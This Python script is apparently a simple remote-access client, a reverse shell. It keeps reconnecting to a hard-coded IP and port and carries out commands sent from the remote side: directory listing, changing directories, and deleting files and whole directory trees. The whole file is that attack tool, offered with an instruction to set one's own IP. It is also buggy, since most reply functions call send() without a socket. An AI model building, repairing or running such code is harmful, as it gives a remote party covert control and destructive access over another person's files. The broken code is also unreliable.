import socket
import time
import os
import shutil
import colorama as clr

host="192.168.18.170"#Change with your ip look manual there are some important info for running it
port=1235
def ts():
    time.sleep(3)
def connectionstatus(cls):
    try:
        status=cls.connect_ex((host,port))
        return status==0
    except Exception as e:
        print(f"Error occured in connction status function error issue: {e}")
    return False
def send(cls,txt):
    cls.send(txt.encode('utf-8'))
def recive(cls):
    try:
        command=cls.recv(4096).decode('utf-8')
        if not command:
            raise ConnectionError()
        if command.startswith("ls"):
            commandls(command)
        elif command.startswith("cd"):
            commandcd(command)
        elif command == "pwd":
            pdir()
        elif command.startswith("rm ") and not command.startswith("rmdir"):
            commandrm(command)
        elif command.startswith("rmdir"):
            commandrmdir(command)
        else:
            send(cls, "Invalid command!")
    except:
        raise ConnectionError()
def tm():
    time.sleep(0.5)
def pdir():
    tm()
    send(clr.Fore.GREEN+"Current Working directory: "+os.getcwd())
def odir():
    tm()
    os.chdir("..")
    send(clr.Fore.BLUE+"Gone one step back")
def ls():
    tm()
    stuff=os.listdir(os.getcwd())
    send(f"{clr.Fore.YELLOW}Stuff inside current dir: {stuff}")
def filter(num, text):
    filtered = ""
    for r in range(min(num, len(text))):
        filtered += text[r]
    return filtered
def trim(a,b,text):
    ran=b-a
    trimed=""
    for l in range(ran):
        trimed+=text[a]
        a+=1
    return trimed
def commandls(command):
    path=trim(3,len(command),command)
    if command=="ls":
        send(clr.Fore.YELLOW+str(os.listdir(os.getcwd())))
    else:
        send(clr.Fore.YELLOW+str(os.listdir(path)))
def commandcd(command):
    path=trim(3,len(command),command)
    try:
        os.chdir(path)
    except:
        send("No such directory!")
def commandrm(command):
    path1=trim(3,len(command),command)
    try:
        os.remove(path1)
    except:
        send("Not a file!")
def commandrmdir(command):
    path=trim(6,len(command),command)
    try:
        shutil.rmtree(path)
    except:
        send("Not a directory!")
try:
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if connectionstatus(client_socket):
                print("Available!")
                while True:
                    try:
                        recive(client_socket)
                    except:
                        print("Server disconnected. Reinitializing...")
                        client_socket.close()
                        break
            else:
                print("Unavilable")
                print("Trying again in 3 seconds!")
            ts()
        except KeyboardInterrupt:
            print("Quitting...")
            client_socket.close()
            break
        except:
            client_socket.close()
            ts()
            continue
except KeyboardInterrupt:
    print("Quitting...")
    client_socket.close()
